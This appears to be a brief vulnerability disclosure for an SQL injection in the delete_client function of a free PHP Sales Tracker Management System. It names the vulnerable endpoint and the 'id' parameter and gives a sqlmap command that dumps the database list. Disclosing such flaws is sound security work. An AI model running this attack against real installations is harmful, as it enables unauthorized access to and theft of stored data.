Download sourcecode from https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html
Deploy the system
The sql injection url: http://192.168.131.135/php-sts/classes/Master.php?f=delete_client
 Vulnerability trigger parameter: id
sourcecode:
![sts3-11](https://user-images.githubusercontent.com/127364570/223948598-6e6f90d8-527c-4468-ba59-014ee377374c.JPG)

The delete_client  function received the parameter and  there is no filtering operation for parameters.  Directly compose sql statements for database operation.  This causes sql injection.

![sts3-1](https://user-images.githubusercontent.com/127364570/223948677-83e541a6-8778-4d9d-9df8-ae1b5a345eb4.JPG)


sqlmap:  sqlmap.py -r c:\tmp\sts-1.txt -p id --risk 2 --dbs

![sts3-2](https://user-images.githubusercontent.com/127364570/223949497-dced8985-a7f9-44f8-b53f-16b242fcef9d.JPG)

![sts3-3](https://user-images.githubusercontent.com/127364570/223949520-a36f1521-b996-41c0-8d9d-335d2c0b4e59.JPG)

